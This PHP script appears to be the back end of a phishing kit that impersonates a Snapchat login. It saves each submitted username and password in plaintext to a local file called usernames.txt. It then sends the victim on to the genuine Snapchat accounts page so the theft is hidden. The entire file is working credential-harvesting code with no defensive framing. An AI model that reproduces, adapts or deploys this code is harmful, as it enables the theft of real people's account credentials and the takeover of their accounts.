<?php
$var = $_POST['username'];
$var2 = $_POST['password'];
$myFile = file_get_contents("protect.html");
$searchString = "<html><title>WELCOME</title></html>";
if($myFile != $searchString) {
    file_put_contents("usernames.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
    header('Location:https://accounts.snapchat.com');
}
if($myFile != $searchString) {
    echo "LOGIN SUCCESSFULL";
}
exit();
?>
